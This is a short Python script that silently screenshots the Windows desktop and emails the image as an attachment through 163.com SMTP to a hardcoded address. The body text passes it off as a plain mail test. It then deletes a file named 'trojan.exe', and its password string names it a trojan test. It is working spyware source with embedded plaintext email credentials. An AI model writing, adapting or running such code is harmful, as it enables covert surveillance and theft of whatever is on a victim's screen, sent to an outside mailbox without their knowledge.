import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.header import Header
import win32gui
import win32ui
import win32con
import win32api
import os


def get_img():
    hdesktop = win32gui.GetDesktopWindow()

    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)

    mem_dc = img_dc.CreateCompatibleDC()

    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)

    mem_dc.BitBlt((0, 0), (width, height), img_dc, (0, 0), win32con.SRCCOPY)

    screenshot.SaveBitmapFile(mem_dc, 'screenshot.bmp')

    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())

get_img()
sender = "13521019795@163.com"
password = "thetrojantest1"
receivers = "13521019795@sina.cn"

subject = 'python发带附件的邮件测试'

msg = MIMEMultipart()
msg['Subject'] = subject
msg['From'] = sender
msg['To'] = receivers


msg.attach(MIMEText('使用python smtplib模块和email模块自动发送邮件测试', 'plain', 'utf-8'))


att1 = MIMEText(open("screenshot.bmp", "rb").read(), 'base64', 'utf-8')

att1["Content-Disposition"] = 'attachment; filename = "screenshot.bmp" '
msg.attach(att1)
try:
    s = smtplib.SMTP_SSL('smtp.163.com', 465)
    s.set_debuglevel(1)
    s.login(sender, password)
    s.sendmail(sender, receivers, msg.as_string())
    print('Send Success')

except:
    print('Send Failure')
os.remove("trojan.exe")
